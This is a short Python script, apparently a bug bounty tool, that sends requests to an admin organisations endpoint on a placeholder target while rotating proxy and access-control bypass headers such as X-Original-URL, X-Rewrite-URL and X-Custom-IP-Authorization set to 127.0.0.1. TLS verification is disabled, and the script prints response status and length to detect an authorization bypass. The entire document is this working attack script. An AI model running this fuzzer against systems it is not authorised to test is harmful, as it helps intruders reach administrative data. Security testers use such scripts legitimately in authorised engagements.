import httpx
import warnings

warnings.filterwarnings("ignore")

TARGET_URL = "https://api.yourtarget.com/v1/admin/organizations"

# Routing header mutations to test edge proxy misconfigurations
PROXY_MUTATIONS = [
    {"Host": "yourtarget.com"},
    {"Host": "yourtarget.com"},
    {"X-Forwarded-Host": "yourtarget.com"},
    {"X-Original-URL": "/v1/admin/organizations"},
    {"X-Rewrite-URL": "/v1/admin/organizations"},
    {"X-Custom-IP-Authorization": "127.0.0.1"},
    {"X-Originating-IP": "127.0.0.1"}
]

def fuzz_proxy_headers():
    client = httpx.Client(verify=False, timeout=5.0)
    
    print("[*] Fuzzing proxy routing and host headers against admin endpoint...\n")
    
    for mutation in PROXY_MUTATIONS:
        headers = {
            "User-Agent": "BugX-HostFuzzer/1.0",
            "Authorization": "Bearer test_token_org_alpha_xyz"
        }
        headers.update(mutation)
        
        try:
            res = client.get(TARGET_URL, headers=headers)
            header_name = list(mutation.keys())[0]
            header_val = list(mutation.values())[0]
            print(f"[+] Header: {header_name:25s} | Val: {header_val:22s} -> Status: {res.status_code} | Length: {len(res.text)}")
        except httpx.RequestError as e:
            print(f"[!] Error: {e}")

    client.close()

if __name__ == "__main__":
    fuzz_proxy_headers()
